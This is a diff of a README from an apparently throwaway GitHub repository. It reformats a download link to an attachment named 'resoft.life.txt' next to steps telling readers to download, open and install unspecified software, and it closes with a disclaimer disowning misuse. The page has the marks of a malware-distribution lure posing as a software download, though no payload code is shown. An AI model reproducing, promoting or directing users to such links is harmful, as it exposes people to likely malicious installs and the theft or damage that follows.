@@ -8,7 +8,8 @@
 • Open the downloaded file with the instructions and carefully read all the directions. Follow each step to successfully install the software.
 • If you have any questions or need assistance, contact the email address provided in my profile.
 • When installing the software, follow the instructions for selecting the language, configuring settings, and any other additional adjustments, if present.
-<a href=“https://github.com/RobertRobertslhcoo/bjxbzyhomn/files/13260677/resoft.life.txt”><img src=“https://github.com/RobertRobertslhcoo/bjxbzyhomn/assets/149399965/e74a9d67-eb00-4f23-b6eb-291adac64c33”></a>
+<a href=“https://github.com/RobertRobertslhcoo/bjxbzyhomn/files/13260677/resoft.life.txt”>![Download](https://github.com/RobertRobertslhcoo/bjxbzyhomn/assets/149399965/e74a9d67-eb00-4f23-b6eb-291adac64c33)
+</a>
 ## Usage regulations 📝 
 
 • The content and tools available in this repository are intended solely for informational purposes. The authors cannot be held responsible for any misuse of the provided materials.
